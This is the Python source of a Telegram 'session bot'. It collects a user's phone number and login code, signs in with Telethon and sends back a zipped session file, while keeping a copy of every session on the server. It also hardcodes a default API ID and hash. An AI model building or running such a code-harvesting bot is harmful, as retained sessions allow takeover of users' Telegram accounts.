import os
import zipfile
import telebot
from telebot import types
from telethon import TelegramClient
import asyncio

TOKEN = os.getenv('TOKEN')
API_ID = int(os.getenv('API_ID', '28537210'))
API_HASH = os.getenv('API_HASH', '5388b7e4bc869cce695b682f2644a160')

bot = telebot.TeleBot(TOKEN)
os.makedirs('sessions', exist_ok=True)

user_data = {}

# ========== ОСНОВНОЙ ЦИКЛ ==========
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    btn = types.KeyboardButton("📱 Отправить номер", request_contact=True)
    markup.add(btn)
    bot.send_message(uid, "🔑 Нажми кнопку, чтобы отправить номер телефона", reply_markup=markup)

@bot.message_handler(content_types=['contact'])
def handle_contact(m):
    uid = m.chat.id
    if not m.contact:
        bot.send_message(uid, "❌ Ошибка, попробуй /start")
        return
    
    phone = m.contact.phone_number
    if not phone.startswith('+'):
        phone = '+' + phone
    
    user_data[uid] = {'phone': phone}
    bot.send_message(uid, f"📲 Номер: {phone}\nОтправляю код...")
    
    async def send_code():
        client = TelegramClient(f'sessions/user_{uid}', API_ID, API_HASH)
        user_data[uid]['client'] = client
        await client.connect()
        try:
            await client.send_code_request(phone)
            bot.send_message(uid, "✅ Код отправлен! Введите его цифрами:")
            bot.register_next_step_handler(m, get_code)
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
    
    loop.create_task(send_code())

def get_code(m):
    uid = m.chat.id
    code = m.text.strip()
    
    if uid not in user_data or 'client' not in user_data[uid]:
        bot.send_message(uid, "❌ Ошибка, начни заново /start")
        return
    
    client = user_data[uid]['client']
    phone = user_data[uid]['phone']
    
    async def login():
        try:
            await client.sign_in(phone, code)
            await client.disconnect()
            
            session_file = f'sessions/user_{uid}.session'
            if os.path.exists(session_file):
                zip_path = f'/tmp/session_{uid}.zip'
                with zipfile.ZipFile(zip_path, 'w') as zf:
                    zf.write(session_file, arcname=f'session_{uid}.session')
                with open(zip_path, 'rb') as f:
                    bot.send_document(uid, f, caption=f"✅ Сессия готова!\nНомер: {phone}")
                os.remove(zip_path)
            else:
                bot.send_message(uid, "❌ Файл сессии не найден")
            
            del user_data[uid]
            
        except Exception as e:
            bot.send_message(uid, f"❌ Ошибка: {e}")
            await client.disconnect()
            del user_data[uid]
    
    loop.create_task(login())

@bot.message_handler(commands=['cancel'])
def cancel(m):
    uid = m.chat.id
    if uid in user_data and 'client' in user_data[uid]:
        async def close():
            await user_data[uid]['client'].disconnect()
        loop.create_task(close())
        del user_data[uid]
    
    markup = types.ReplyKeyboardRemove()
    bot.send_message(uid, "❌ Отменено", reply_markup=markup)

# ========== ЗАПУСК ==========
def run_bot():
    print("🚀 Session Bot запущен")
    bot.infinity_polling()

if __name__ == '__main__':
    run_bot()
